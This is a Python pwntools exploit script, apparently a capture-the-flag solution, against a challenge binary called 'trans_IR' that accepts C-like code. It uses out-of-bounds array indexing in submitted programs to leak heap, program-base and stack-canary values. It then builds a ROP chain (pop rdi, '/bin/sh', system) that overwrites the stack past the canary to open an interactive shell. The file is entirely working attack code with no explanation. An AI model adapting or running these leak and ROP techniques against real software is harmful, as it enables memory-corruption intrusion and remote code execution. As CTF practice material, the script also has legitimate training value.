# -*- coding:utf-8 -*-
from pwn import *

arch = 64
challenge = './trans_IR'

context.os='linux'
#context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'

elf = ELF(challenge)
#libc = ELF('libc-2.31.so')

rl = lambda    a=False        : p.recvline(a)
ru = lambda a,b=True    : p.recvuntil(a,b)
rn = lambda x            : p.recvn(x)
sn = lambda x            : p.send(x)
sl = lambda x            : p.sendline(x)
sa = lambda a,b            : p.sendafter(a,b)
sla = lambda a,b        : p.sendlineafter(a,b)
irt = lambda            : p.interactive()
dbg = lambda text=None  : gdb.attach(p, text)
# lg = lambda s,addr        : log.info('33[1;31;40m %s --> 0x%x 33[0m' % (s,addr))
lg = lambda s            : log.info('33[1;31;40m %s --> 0x%x 33[0m' % (s, eval(s)))
uu32 = lambda data        : u32(data.ljust(4, b'x00'))
uu64 = lambda data        : u64(data.ljust(8, b'x00'))

local = 0
if local:
    p = process(challenge)
else:
    p = remote('127.0.0.1','2102')

def debug():
    gdb.attach(p,"b *$rebase(0x72EC)\n")
    pause()

def cmd(op):
    sla("5.exit",str(op))

code = """
int main(){
    int a;
    struct test t;
	int arr[255][255][255][255][255][255][255];
    arr[32][255][255][255][255][255][a]=0;
}
"""

cmd(4)	
sla("input code:",code)
cmd(1)

p.recvuntil("第6行：")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
heap_base = leak_addr - 0xa970
success("leak_addr >> "+hex(leak_addr))
success("heap_base >> "+hex(heap_base))

code = """
int main(){
    int a;
    struct test t;
	int arr[255][255][255][255][255][255][255];
    arr[48][255][255][255][255][255][a]=0;
}
"""

cmd(4)	
sla("input code:",code)
cmd(1)

p.recvuntil("第6行：")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
pro_base = leak_addr - 0xa10a
success("leak_addr >> "+hex(leak_addr))
success("pro_base >> "+hex(pro_base))

bss_addr = pro_base + 0x19040 + 0x200
system = pro_base + 0xCD92
pop_rdi = pro_base + 0x00000000000125b3
success("system >> "+hex(system))
success("pop_rdi >> "+hex(pop_rdi))

stack_heap = heap_base + 0x11f20 +1-0x30 
success("stack_heap >> "+hex(stack_heap))

#debug()

stack_heaps = []
for i in range(6):
    stack_heaps.append((stack_heap>>(8*i)) % 256)
print(stack_heaps)

code = """
int main(){
    int a;
    struct test t;
	int arr[255][255][255][255][255][255][255][255][255];
    arr[%s][%s][%s][255][255][255][255][255][a]=0;
}
""" % (stack_heaps[2],stack_heaps[1],stack_heaps[0])

cmd(4)	
sla("input code:",code)
cmd(1)

p.recvuntil("第6行：")
leak_addr = u64(p.recv(7).ljust(8,"\x00"))
canary_stack = leak_addr * 0x100

success("leak_addr >> "+hex(leak_addr))
success("canary_stack >> "+hex(canary_stack))

canary_stacks = []
for i in range(8):
    canary_stacks.append((canary_stack>>(8*i)) % 256)
print(canary_stacks)

bss_addrs = []
for i in range(8):
    bss_addrs.append((bss_addr>>(8*i)) % 256)
print(bss_addrs)

systems = []
for i in range(8):
    systems.append((system>>(8*i)) % 256)
print(systems)

pop_rdis = []
for i in range(8):
    pop_rdis.append((pop_rdi>>(8*i)) % 256)
print(pop_rdis)

code = """
int main(){
	cat ./flag;
}
"""

cmd(4)	
sla("input code:",code)
cmd(1)

binsh = heap_base +0x199fe
binshs = []
for i in range(8):
    binshs.append((binsh>>(8*i)) % 256)
print(binshs)

#debug()

code = """
int main(){
	int arr[255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255];
    arr[%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][0][0][0][0][0][0][0][0][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][255][255][255][255][255][255]=0;
}
""" % (systems[7],systems[6],systems[5],systems[4],
       systems[3],systems[2],systems[1],systems[0],
       binshs[7],binshs[6],binshs[5],binshs[4],
       binshs[3],binshs[2],binshs[1],binshs[0],
       pop_rdis[7],pop_rdis[6],pop_rdis[5],pop_rdis[4],
       pop_rdis[3],pop_rdis[2],pop_rdis[1],pop_rdis[0],
       canary_stacks[7],canary_stacks[6],canary_stacks[5],canary_stacks[4],
       canary_stacks[3],canary_stacks[2],canary_stacks[1],canary_stacks[0],
       bss_addrs[7],bss_addrs[6],bss_addrs[5],bss_addrs[4],
       bss_addrs[3],bss_addrs[2],bss_addrs[1],bss_addrs[0])

cmd(4)	
sla("input code:",code)
cmd(1)

p.interactive()
